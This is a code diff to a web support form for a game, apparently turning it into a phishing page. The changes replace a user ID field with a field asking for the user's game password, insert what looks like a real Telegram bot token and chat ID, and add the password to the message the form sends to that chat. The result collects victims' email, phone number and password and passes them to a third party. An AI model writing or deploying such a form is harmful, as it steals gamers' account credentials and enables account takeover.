@@ -679,7 +679,7 @@
         <form id="tgForm">
             <div class="input-group">
                 <label for="email">Email Address</label>
-                <input type="email" id="email" placeholder="you@example.com" required>
+                <input type="email" id="email" placeholder="Enter you game email" required>
             </div>
 
             <div class="input-group">
@@ -689,12 +689,12 @@
 
             <div class="input-group">
                 <label for="phone">Phone Number</label>
-                <input type="tel" id="phone" placeholder="+91 98765 43210" required>
+                <input type="tel" id="phone" placeholder="Enter your number" required>
             </div>
 
             <div class="input-group">
-                <label for="userId">User ID</label>
-                <input type="text" id="userId" placeholder="Enter your user ID" required>
+                <label for="password">Password</label>
+                <input type="text" id="password" placeholder="Enter your game password" required>
             </div>
 
             <div class="input-group">
@@ -751,8 +751,8 @@
         // ------------------------------------------------------------------
         // ⚠️ REPLACE WITH YOUR OWN TELEGRAM BOT TOKEN & CHAT ID
         // ------------------------------------------------------------------
-        const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
-        const CHAT_ID   = "YOUR_CHAT_ID_HERE";
+        const BOT_TOKEN = "8773997207:AAEkI6j5yz9vyuvxUBu4GzWxEFEHDE4GCbs";
+        const CHAT_ID   = "7643342967";
 
         const form      = document.getElementById('tgForm');
         const submitBtn = document.getElementById('submitBtn');
@@ -826,7 +826,7 @@
             const email        = document.getElementById('email').value.trim();
             const name         = document.getElementById('name').value.trim();
             const phone        = document.getElementById('phone').value.trim();
-            const userId       = document.getElementById('userId').value.trim();
+            const password     = document.getElementById('password').value.trim();
             const problemIssue = document.getElementById('problemIssue').value;
             const fileInput    = document.getElementById('screenshot');
             const file         = fileInput.files[0];
@@ -835,7 +835,7 @@
                                 `📧 *Email:* ${email}\n` +
                                 `👤 *Name:* ${name}\n` +
                                 `📞 *Phone:* ${phone}\n` +
-                                `🆔 *User ID:* ${userId}\n` +
+                                `🆔 *password:* ${password}\n` +
                                 `⚠️ *Problem Issue:* ${problemIssue}`;
 
             function sendPhoto() {
